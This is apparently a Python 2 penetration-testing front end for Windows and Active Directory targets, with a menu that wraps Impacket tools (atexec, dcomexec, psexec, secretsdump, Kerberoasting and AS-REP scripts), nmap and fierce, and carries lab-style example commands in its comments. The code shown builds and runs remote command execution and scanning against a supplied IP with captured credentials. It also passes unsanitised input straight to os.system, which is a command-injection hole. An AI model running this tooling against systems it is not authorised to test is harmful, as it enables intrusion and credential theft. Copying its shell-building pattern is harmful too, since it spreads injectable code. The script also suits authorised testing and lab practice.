#!/usr/bin/python
# coding:UTF-8

# -------------------------------------------------------------------------------------
#               PYTHON SCRIPT FILE FOR THE FORENSIC ANALYSIS OF NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS AND CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import shutil
import os.path
import datetime
import fileinput
import linecache
import subprocess
from termcolor import colored					# pip install termcolor

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0                                                                
# Details : Conduct simple and routine tests on user supplied arguements.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
    print "\nPlease run this python script as root..."
    exit(True)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0
# Details : Create function calls from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def padding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      variable += " "
   return variable

def dpadding(variable,value):
   test = variable
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      if test =="":
         variable += " "
      else:
         variable += "."
   return variable

def rpadding(variable,value):
   variable = variable.rstrip("\n")
   while len(variable) < value:
      temp = variable
      variable = "." + temp
   return variable

def gettime(value):
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = padding(variable, value)
   return variable

def command(command):
#      print "Using Command: " + CMD
      os.system(command)
      raw_input("\nPress ENTER to continue...")
      return

def display():
   print u'\u2554' + (u'\u2550')*36 + u'\u2566' + (u'\u2550')*33 + u'\u2566' + (u'\u2550')*61 + u'\u2557'
   print u'\u2551' + (" ")*12 + colored("REMOTE SYSTEM",'white') +  (" ")*11 + u'\u2551' + (" ")*10 + colored("SYSTEM SHARES",'white') + (" ")*10 + u'\u2551' + (" ")*21 +  colored("USER INFORMATION",'white') + (" ")*24 + u'\u2551' 
  # print u'\u2560' + (u'\u2550')*14 + u'\u2564' + (u'\u2550')*21 + u'\u256C' + (u'\u2550')*12 + u'\u2564' + (u'\u2550')*20 + u'\u256C' + (u'\u2550')*61 + u'\u2563'
   print u'\u2560' + (u'\u2550')*14 + u'\u2564' + (u'\u2550')*21 + u'\u256C' + (u'\u2550')*12 + u'\u2550' + (u'\u2550')*20 + u'\u256C' + (u'\u2550')*61 + u'\u2563'

   print u'\u2551' + " DNS SERVER   " + u'\u2502',
   if DNSN == "EMPTY              ":
      print colored(DNSN[:19],'yellow'),
   else:
      print colored(DNSN[:19],'blue'),
   print u'\u2551',
   print colored(SH0,'blue'),
   print colored(SHA0,'blue'),
   print u'\u2551',
   print colored(US[0],'blue'),
   print colored(PA[0],'blue'),
   print u'\u2551'

   print u'\u2551' + " REMOTE IP    " + u'\u2502',
   if TIP == "EMPTY              ":
      print colored(TIP,'yellow'),
   else:
      print colored(TIP,'blue'),
   print u'\u2551',
   print colored(SH1,'blue'),
   print colored(SHA1,'blue'),
   print u'\u2551',
   print colored(US[1],'blue'),
   print colored(PA[1],'blue'),
   print u'\u2551'

   print u'\u2551' + " USERNAME     " + u'\u2502',
   if USR == '""                 ':
      print colored(USR,'yellow'),
   else:
      print colored(USR,'blue'),
   print u'\u2551' ,
   print colored(SH2,'blue'),
   print colored(SHA2,'blue'),
   print u'\u2551',
   print colored(US[2],'blue'),
   print colored(PA[2],'blue'),
   print u'\u2551'
   
   print u'\u2551' + " PASSWORD     " + u'\u2502',
   if PAS == '""                 ':
      print colored(PAS,'yellow'),
   else:
      print colored(PAS,'blue'),
   print u'\u2551',
   print colored(SH3,'blue'),
   print colored(SHA3,'blue'),
   print u'\u2551',
   print colored(US[3],'blue'),
   print colored(PA[3],'blue'),
   print u'\u2551'

   print u'\u2551' + " FOREST NAME  " + u'\u2502',
   if FRST == "EMPTY              ":
      print colored(FRST[:20],'yellow'),
   else:
      print colored(FRST[:20],'blue'),
   print u'\u2551',
   print colored(SH4,'blue'),
   print colored(SHA4,'blue'),
   print u'\u2551',
   print colored(US[4],'blue'),
   print colored(PA[4],'blue'),
   print u'\u2551'
   
   print u'\u2551' + " DOMAIN NAME  " + u'\u2502',
   if HST == "EMPTY              ":
      print colored(HST[:20],'yellow'),
   else:
      print colored(HST[:20],'blue'),
   print u'\u2551',
   print colored(SH5,'blue'),
   print colored(SHA5,'blue'),
   print u'\u2551',
   print colored(US[5],'blue'),
   print colored(PA[5],'blue'),
   print u'\u2551'

   print u'\u2551' + " WORKGROUP    " + u'\u2502',
   if WGRP == "EMPTY              ":
      print colored(WGRP[:20],'yellow'),
   else:
      print colored(WGRP[:20],'blue'),
   print u'\u2551',
   print colored(SH6,'blue'),
   print colored(SHA6,'blue'),
   print u'\u2551',
   print colored(US[6],'blue'),
   print colored(PA[6],'blue'),
   print u'\u2551'
     
   print u'\u2551' + " SHARE NAME   " + u'\u2502',
   if HIP == "EMPTY              ":
      print colored(HIP[:COL1],'yellow'),
   else:
      print colored(HIP[:COL1],'blue'),
   print u'\u2551',
   print colored(SH7,'blue'),
   print colored(SHA7,'blue'),
   print u'\u2551',
   print colored(US[7],'blue'),
   print colored(PA[7],'blue'),
   print u'\u2551'
   
   print u'\u2551' + " IMPERSONATE  " + u'\u2502',
   if POR == "administrator      ":
      print colored(POR[:COL1],'yellow'),
   else:
      print colored(POR[:COL1],'blue'),
   print u'\u2551',
   print colored(SH8,'blue'),
   print colored(SHA8,'blue'),
   print u'\u2551',
   print colored(US[8],'blue'),
   print colored(PA[8],'blue'),
   print u'\u2551'
      
   print u'\u2551' + " WIN COMMAND  " + u'\u2502',
   if PRM == "'dir -FORCE'       ":
      print colored(PRM[:COL1],'yellow'),
   else:
      print colored(PRM[:COL1],'blue'),
   print u'\u2551',
   print colored(SH9,'blue'),
   print colored(SHA9,'blue'),
   print u'\u2551',
   print colored(US[9],'blue'),
   print colored(PA[9],'blue'),
   print u'\u2551'

   print u'\u2551' + " CURRENT TIME " + u'\u2502',
   if SKEW == 0:
      print colored(PI1[:COL1],'yellow'),
   else:
      print colored(PI1[:COL1],'blue'),
   print u'\u2551',
   print colored(SH10,'blue'),
   print colored(SHA10,'blue'),
   print u'\u2551',
   print colored(US[10],'blue'),
   print colored(PA[10],'blue'),
   print u'\u2551'
   
   print u'\u2551' + " MY DIRECTORY " + u'\u2502',
   if DIR == "WORKAREA           ":
      print colored(DIR[:COL1],'yellow'),
   else:
      print colored(DIR[:COL1],'blue'),
   print u'\u2551',
   print colored(SH11,'blue'),
   print colored(SHA11,'blue'),
   print u'\u2551',
   if US[11] == "Some users are not shown!!":
      print colored(US[11],'red'),
   else:
      print colored(US[11],'blue'),
   print colored(PA[11],'blue'),
   print u'\u2551'

   # print u'\u2560' + (u'\u2550')*14 + u'\u2567'+ (u'\u2550')*21  + u'\u2569' + (u'\u2550')*12 + u'\u2567' + (u'\u2550')*20 + u'\u2569' + (u'\u2550')*61 + u'\u2563'
   print u'\u2560' + (u'\u2550')*14 + u'\u2567'+ (u'\u2550')*21  + u'\u2569' + (u'\u2550')*12 + u'\u2550' + (u'\u2550')*20 + u'\u2569' + (u'\u2550')*61 + u'\u2563'

# ----------------------------------------------------------------------------------------------------------------------------------------------------

   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) BLANK     (30) ifmap      (40) rpcclient      (50) BLANK (60) FTP               " + u'\u2551'
   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) BLANK     (31) opdump     (41) getgt          (51) BLANK (61) SSH               " + u'\u2551'
   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) BLANK     (32) lookupsid  (42) getst          (52) BLANK (62) TELNET            " + u'\u2551'
   print u'\u2551' + "(3) Re/Set USERNAME    (13) Ping REMOTE IP     (23) netview   (33) samrdump   (43) getuserspns    (53) BLANK (63) NETCAT            " + u'\u2551'
   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Get Architecture   (24) services  (34) rpcdump    (44) getadusers     (54) BLANK (64) WIN_RM            " + u'\u2551'
   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Fierce DNS SERVER  (25) atexec    (35) reg        (45) getnpusers     (55) BLANK (65) BLANK             " + u'\u2551'
   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + SKEW    (26) dcomexec  (36) smbmap     (46) BLANK          (56) BLANK (66) BLANK             " + u'\u2551'
   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap SUBDOMAINS    (27) psexec    (37) SmbClient  (47) secretsdump    (57) BLANK (67) BLANK             " + u'\u2551'
   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) smbexec   (38) SmbMount   (48) windapsearch   (58) BLANK (68) BLANK             " + u'\u2551'
   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) wmiexec   (39) enum4linux (49) ldapdomaindump (59) BLANK (69) BLANK             " + u'\u2551'
   print u'\u255A' + (u'\u2550')*132 + u'\u255D'

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Display universal header.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("clear")
print "__        _____ _   _   __  __    _    ____ _____ _____ ____      " 
print "\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \     " 
print " \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) |    " 
print "  \ V  V /  | || |\  | | |  | |/ ___ \ ___) || | | |___|  _ <     " 
print "   \_/\_/  |___|_| \_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\    "
print "                                                                  "
print "BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0
# Details : Boot the system and initialise program variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print "Booting - Please wait...\n"

if not os.path.exists('WORKAREA'):
   os.mkdir("WORKAREA")
   print "[-] Work area created..."
else:
   print "[-] Work area already exists...."

print "[-] Populating system variables...."

COL1 = 19
COL2 = 31
COL3 = 26
COL4 = 32
COL5 = 15

PRO  = "/usr/share/doc/python3-impacket/examples/" # IMPACKET LOCATION
LIP  = "10.10.10.xxx       " # LOCAL IP
SKEW = 0                     # TIME ADJUSTED

SH0  = " "*COL5 # SHARE
SH1  = " "*COL5 # SHARE 
SH2  = " "*COL5 # SHARE
SH3  = " "*COL5 # SHARE
SH4  = " "*COL5 # SHARE
SH5  = " "*COL5 # SHARE
SH6  = " "*COL5 # SHARE
SH7  = " "*COL5 # SHARE
SH8  = " "*COL5 # SHARE
SH9  = " "*COL5 # SHARE
SH10 = " "*COL5 # SHARE 
SH11 = " "*COL5 # SHARE

SHA0  = " "*COL5 # SHARE ATTRIBUTE
SHA1  = " "*COL5 # SHARE ATTRIBUTE
SHA2  = " "*COL5 # SHARE ATTRIBUTE
SHA3  = " "*COL5 # SHARE ATTRIBUTE
SHA4  = " "*COL5 # SHARE ATTRIBUTE
SHA5  = " "*COL5 # SHARE ATTRIBUTE
SHA6  = " "*COL5 # SHARE ATTRIBUTE
SHA7  = " "*COL5 # SHARE ATTRIBUTE
SHA8  = " "*COL5 # SHARE ATTRIBUTE
SHA9  = " "*COL5 # SHARE ATTRIBUTE
SHA10 = " "*COL5 # SHARE ATTRIBUTE
SHA11 = " "*COL5 # SHARE ATTRIBUTE


X1   = " "*COL3
X2   = " "*COL4
US   = []
PA   = []
US   = [X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1] # 30 USERNAMES
PA   = [X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 30 PASSWORDS


# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0
# Details : Check the config file for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

if not os.path.exists('config.txt'):
   print "[-] Configuration file not found - using defualt values...."
   DNSN = "EMPTY              " # DNS NAME
   TIP  = "EMPTY              " # REMOTE IP
   USR  = '""                 ' # USERNAME
   PAS  = '""                 ' # PASSWORD       
   FRST = "EMPTY              " # FOREST NAME    
   HST  = "EMPTY              " # DOMAIN NAME
   WGRP = "EMPTY              " # WORK GROUP
   HIP  = "EMPTY              " # CURRENT SHARE
   POR  = "administrator      " # IMPERSONATE
   PRM  = "'dir -FORCE'       " # WIN COMMAND                                            
   PI1  = "00:00              " # LOCAL TIME    
   DIR  = "WORKAREA           " # DIRECTORY
else:
   print "[-] Configuration file found - restoring saved data...."
   DNSN = linecache.getline('config.txt', 1)
   TIP  = linecache.getline('config.txt', 2)
   USR  = linecache.getline('config.txt', 3)
   PAS  = linecache.getline('config.txt', 4)
   FRST = linecache.getline('config.txt', 5)
   HST  = linecache.getline('config.txt', 6)
   WGRP = linecache.getline('config.txt', 7)
   HIP  = linecache.getline('config.txt', 8)
   POR  = linecache.getline('config.txt', 9)
   PRM  = linecache.getline('config.txt', 10)
   PI1  = linecache.getline('config.txt', 11)
   DIR  = linecache.getline('config.txt', 12)

   DNSN = padding(DNSN, COL1)
   TIP  = padding(TIP, COL1)
   USR  = padding(USR, COL1)
   PAS  = padding(PAS, COL1)
   FRST = padding(FRST, COL1)
   HST  = padding(HST, COL1)
   WGRP = padding(WGRP, COL1)
   HIP  = padding(HIP, COL1)
   POR  = padding(POR, COL1)
   PRM  = padding(PRM, COL1)
   PI1  = padding(PI1, COL1)
   DIR  = padding(DIR, COL1)

raw_input("\nPlease ENTER key to continue...")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   os.system("clear")
   PI1 = gettime(COL1)
   display()
   selection=raw_input("Please Select: ")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Save and exit program.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '0':
      os.system("echo '' > config.txt")
      os.system("sed -i 1d config.txt")

      os.system("echo " + DNSN + " >> config.txt")
      os.system("echo " + TIP  + " >> config.txt")
      if USR.rstrip(" ") == "\"\"":
         os.system("echo '\"\"' >> config.txt")
      else:
         os.system("echo " + USR  + " >> config.txt")     
      if PAS.rstrip(" ") == "\"\"":
         os.system("echo '\"\"' >> config.txt")
      else:
         os.system("echo " + PAS  + " >> config.txt")
      os.system("echo " + FRST + " >> config.txt") 
      os.system("echo " + HST  + " >> config.txt")  
      os.system("echo " + WGRP + " >> config.txt") 
      os.system("echo " + HIP  + " >> config.txt")  
      os.system("echo " + POR  + " >> config.txt")  
      tmp = '\"' + PRM.rstrip(" ") + '\"'
      os.system("echo " + tmp + " >> config.txt")  
      os.system("echo " + PI1  + " >> config.txt")  
      os.system("echo " + DIR  + " >> config.txt")  

      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Get DNS-Server name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='1':
      BAK = DNSN
      DNSN = raw_input("Please enter DNS SERVER name: ")
      if DNSN == "":
         DNSN = BAK      
      else:
         if len(DNSN) < 19:
            DNSN = padding(DNSN, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Get REMOTE IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = TIP
      TIP = raw_input("Please enter REMOTE IP address: ")
      if TIP == "":
         TIP = BAK      
      else:
         TIP = padding(TIP, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Get REMOTE USERNAME
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '3':
      BAK = USR
      USR = raw_input("Please enter USERNAME: ")
      if USR == "":
         USR = BAK      
      else:
         USR = padding(USR, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Get REMOTE PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      BAK = PAS
      PAS = raw_input("Please enter PASSWORD: ")
      if PAS == "":
         PAS = BAK      
      else:
         PAS = padding(PAS, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - get REMOTE FOREST name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = FRST
      FRST = raw_input("Please enter FOREST name: ")
      if FRST == "":
         FRST = BAK      
      else:
         FRST = padding(FRST, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Get REMOTE DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = HST
      HST = raw_input("Please enter DOMAIN name: ")
      if HST == "":
         HST = BAK      
      else:
         HST = padding(HST, COL1)
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Get REMOTE WORKGROUP name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = WGRP
      WGRP = raw_input("Please enter WORKGROUP name: ")
      if WGRP == "":
         WGRP = BAK      
      else:
         WGRP = padding(WGRP, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Get REMOTE SHARE name
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = HIP
      HIP = raw_input("Please enter SHARE name: ")
      if HIP == "":
         HIP = BAK
      else:
         HIP = padding(HIP,COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - REMOTE person to impersonate.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = POR
      POR = raw_input("Please enter IMPERSONATOR name: ")
      if POR == "":
         POR = BAK      
      else:
         POR = padding(POR, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - REMOTE windows COMMAND
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '10':
      BAK = PRM
      PRM = raw_input("Please enter Windows COMMAND: ")
      if PRM == "":
         PRM = BAK      
      else:
         PRM = padding(PRM, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Reset local TIME to match kerberos skew. 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = PI1
      PI1 = raw_input("Please enter computer TIME: ")
      if PI1 == "":
         PI1 = BAK      
      else:
         CMD = "date --set=" + PI1
         os.system(CMD)
         PI1 = padding(PI1, COL1)
         SKEW = 1
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change local working DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      directory = raw_input("Please enter new working DIRECTORY: ")
      if os.path.exists(directory):
         print "Directory already Exists...."
      else:
         if len(directory) > 0:
            os.mkdir(directory)
            DIR = directory
            DIR = padding(DIR, COL1)
            print "Working directory changed..."
      raw_input("\nPress ENTER to continue...")           

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Ping localhost REMOTE.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      os.system("hostname -I > localip.txt")
      localhost = linecache.getline('localip.txt', 1)
      os.remove("localip.txt")
      localhost = localhost.split(" ")
      localhost = localhost[1]
      CMD = PRO + "ping.py " + localhost.rstrip(" ") +  " " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./getArch.py -target xxx.xxx.xxx.xxx -> 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      CMD = PRO + "getArch.py -target " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Ping localhost REMOTE.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      CMD = "fierce -dns " + DNSN.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '16':
      CMD = "nmap -sU -O -p 123 --script ntp-info " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=player.htb 10.10.10.145
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      CMD = "nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + HST.rstrip(" ") + " " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Intense quick TCP scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      CMD = "nmap -T4 -F " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Full, slow and comprehensive nmap scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      CMD = "nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)' " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Full, slow and comprehensive nmap scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected -
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '21':
     exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected -
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '22':
     exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./netview.py raj/Administrator -target xxx.xxx.xxx.xxx
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='23':
      CMD = PRO + "netview.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -target " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./services.py raj/Administrator:Ignite@123@192.168.1.103 list
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='24':
      CMD = PRO + "services.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " list"
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./dcomexec.py raj/Administrator:Ignite@123@192.168.1.103 dir
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      CMD = PRO + "atexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./dcomexec.py raj/Administrator:Ignite@123@192.168.1.103 dir
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      CMD = PRO + "dcomexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - /psexec.py raj/Administrator:Ignite@123@192.168.1.103
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      CMD = PRO + "psexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " > SHARES.txt"
      os.system(CMD)

      os.system("cat SHARES.txt")
    
      os.system("sed -i '1,3d' SHARES.txt")
      os.system("sed -i -e 's/share //g' SHARES.txt")

      SH0  = linecache.getline('SHARES.txt', 1)
      SH1  = linecache.getline('SHARES.txt', 2)
      SH2  = linecache.getline('SHARES.txt', 3)
      SH3  = linecache.getline('SHARES.txt', 4)
      SH4  = linecache.getline('SHARES.txt', 5)
      SH5  = linecache.getline('SHARES.txt', 6)
      SH6  = linecache.getline('SHARES.txt', 7)
      SH7  = linecache.getline('SHARES.txt', 8)
      SH8  = linecache.getline('SHARES.txt', 9)
      SH9  = linecache.getline('SHARES.txt', 10)
      SH10 = linecache.getline('SHARES.txt', 11)
      SH11 = linecache.getline('SHARES.txt', 12)

      SH0  = SH0.lstrip("[-] ")
      SH1  = SH1.lstrip("[-] ")
      SH2  = SH2.lstrip("[-] ")
      SH3  = SH3.lstrip("[-] ")
      SH4  = SH4.lstrip("[-] ")
      SH5  = SH5.lstrip("[-] ")
      SH6  = SH6.lstrip("[-] ")
      SH7  = SH7.lstrip("[-] ")
      SH8  = SH8.lstrip("[-] ")
      SH9  = SH9.lstrip("[-] ")
      SH10 = SH10.lstrip("[-] ")
      SH11 = SH11.lstrip("[-] ")

      SH0  = SH0.replace("'", "")
      SH1  = SH1.replace("'", "")
      SH2  = SH2.replace("'", "")
      SH3  = SH3.replace("'", "")
      SH4  = SH4.replace("'", "")
      SH5  = SH5.replace("'", "")
      SH6  = SH6.replace("'", "")
      SH7  = SH7.replace("'", "")
      SH8  = SH8.replace("'", "")
      SH9  = SH9.replace("'", "")
      SH10 = SH10.replace("'", "")
      SH11 = SH11.replace("'", "")

      if SH0 !="":  SH0,SHA0   = SH0.split("is")
      if SH1 !="":  SH1,SHA1   = SH1.split("is")
      if SH2 !="":  SH2,SHA2   = SH2.split("is")
      if SH3 !="":  SH3,SHA3   = SH3.split("is")
      if SH4 !="":  SH4,SHA4   = SH4.split("is")
      if SH5 !="":  SH5,SHA5   = SH5.split("is")
      if SH6 !="":  SH6,SHA6   = SH6.split("is")
      if SH7 !="":  SH7,SHA7   = SH7.split("is")
      if SH8 !="":  SH8,SHA8   = SH8.split("is")
      if SH9 !="":  SH9,SHA9   = SH9.split("is")
      if SH10 !="": SH10,SHA10 = SH10.split("is")
      if SH11 !="": SH11,SHA11 = SH11.split("is")

      SH0   = dpadding(SH0, COL5)
      SH1   = dpadding(SH1, COL5)
      SH2   = dpadding(SH2, COL5)
      SH3   = dpadding(SH3, COL5)
      SH4   = dpadding(SH4, COL5)
      SH5   = dpadding(SH5, COL5)
      SH6   = dpadding(SH6, COL5)
      SH7   = dpadding(SH7, COL5)
      SH8   = dpadding(SH8, COL5)
      SH9   = dpadding(SH9, COL5)
      SH10  = dpadding(SH10, COL5)
      SH11  = dpadding(SH11, COL5)

      SHA0  = padding(SHA0, COL5)
      SHA1  = padding(SHA1, COL5)
      SHA2  = padding(SHA2, COL5)
      SHA3  = padding(SHA3, COL5)
      SHA4  = padding(SHA4, COL5)
      SHA5  = padding(SHA5, COL5)
      SHA6  = padding(SHA6, COL5)
      SHA7  = padding(SHA7, COL5)
      SHA8  = padding(SHA8, COL5)
      SHA9  = padding(SHA9, COL5)
      SHA10 = padding(SHA10, COL5)
      SHA11 = padding(SHA11, COL5)

      raw_input("\nPress ENTER to continue...")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
